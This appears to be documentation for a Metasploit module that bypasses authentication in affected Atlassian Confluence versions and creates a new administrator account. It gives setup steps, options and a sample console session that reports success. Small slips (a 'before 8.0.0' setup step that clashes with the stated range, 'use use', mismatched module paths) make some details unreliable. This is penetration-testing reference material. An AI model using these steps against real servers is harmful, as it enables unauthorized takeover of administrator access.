## Vulnerable Application
This module exploits an Broken Access Control vulnerability in Atlassian Confluence servers leads to Authentication Bypass.

A specially crafted request can be create new admin account without authorization in the Atlassian server.

Affecting Atlassian Confluence from version 8.0.0 to before 8.3.3, from version 8.4.0 before 8.4.3 and from version 8.5.0 before 8.5.2.

## Verification Steps

1. Setting up a working installation of Atlassian Confluence Server before 8.0.0
2. Start `msfconsole`
3. `use use auxiliary/admin/http/atlassian_confluence_auth_bypass`
4. `set RHOST <IP>`
5. `set RPORT <PORT>`
6. `check`
7. You should see `The target is vulnerable`
8. `set NEW_USERNAME <username>`
9. `set NEW_PASSWORD <password>`
10. `run`
11. You should get a new admin account.

## Options
### TARGETURI
Path to Atlassian Confluence installation ("/" is the default)

### NEW_USERNAME
Username to be used when creating a new user with admin privileges. The username must not contain capital letters.

### NEW_PASSWORD
Password to be used when creating a new user with admin privileges.

### NEW_EMAIL
E-mail to be used when creating a new user with admin privileges.

## Scenarios
### Tested on Confluence Server 8.0.0 with Linux target (Ubuntu 20.04)
```
msf6 > use auxiliary/multi/http/atlassian_confluence_auth_bypass
msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set RHOSTS <YOUR_TARGET>
RHOSTS => <YOUR_TARGET>
msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_USERNAME admin_1337
NEW_USERNAME => admin_1337
msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > set NEW_PASSWORD admin_1337
NEW_PASSWORD => admin_1337
msf6 > auxiliary(admin/http/atlassian_confluence_auth_bypass) > run
[*] Running module against <YOUR_TARGET>

[+] Admin user was created successfully. Credentials: admin_1337 - admin_1337
[+] Now you can login as adminstrator from: http://<YOUR_TARGET>:8090/login.action
[*] Auxiliary module execution completed
```
